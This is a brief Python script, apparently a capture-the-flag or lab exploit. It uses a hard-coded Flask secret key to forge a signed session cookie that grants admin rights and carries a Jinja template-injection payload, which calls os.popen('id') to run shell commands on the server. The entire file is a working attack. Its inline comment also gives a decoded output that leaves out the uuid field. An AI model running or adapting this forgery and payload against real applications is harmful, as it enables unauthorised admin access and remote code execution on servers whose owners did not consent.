import hashlib
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "30f5e5b5289165a10211f4443d5e8fb666f8cdc2fe8d69a574d2e8c60bed7f9e"

s = app.session_interface.get_signing_serializer(app)
token = s.dumps({
    "_permanent": True,
    "uuid": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "is_admin": True
})
print(s.loads(token, max_age=31 * 24 * 3600))   # {'_permanent': True, 'is_admin': True}
print(token)
